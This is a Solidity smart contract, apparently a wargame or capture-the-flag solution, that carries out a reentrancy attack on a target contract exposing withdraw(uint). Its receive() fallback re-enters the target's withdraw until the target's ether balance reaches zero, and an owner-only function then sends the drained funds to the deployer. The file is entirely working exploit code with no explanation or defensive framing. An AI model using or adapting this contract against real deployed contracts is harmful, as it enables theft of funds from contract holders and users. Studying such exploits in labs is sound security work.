pragma solidity ^0.8.4;


interface IReentrance {
     function withdraw(uint _amount) external;
}

contract ReProxy {
    IReentrance target;
    uint amount;
    address owner;

    constructor(address _targetAddr, uint _amount) {
        target = IReentrance(_targetAddr);
        amount = _amount;
        owner = msg.sender;
    }

    // initialize attack
    function triggerAttack() public {
        target.withdraw(amount);
    }

    // this is called from receive until target's balance is 0
    function reenter() internal {
        if (amount < address(target).balance) {
            target.withdraw(amount);
        } else {
            target.withdraw(address(target).balance);
        }
    }

    // called whenever target contract sends eth to this contract
    receive() external payable {
        if (address(target).balance > 0) {
            reenter();
        }
    }

    // get eth back to eoa
    function withdraw() public {
        require(owner == msg.sender);

        payable(owner).transfer(address(this).balance);
    }
}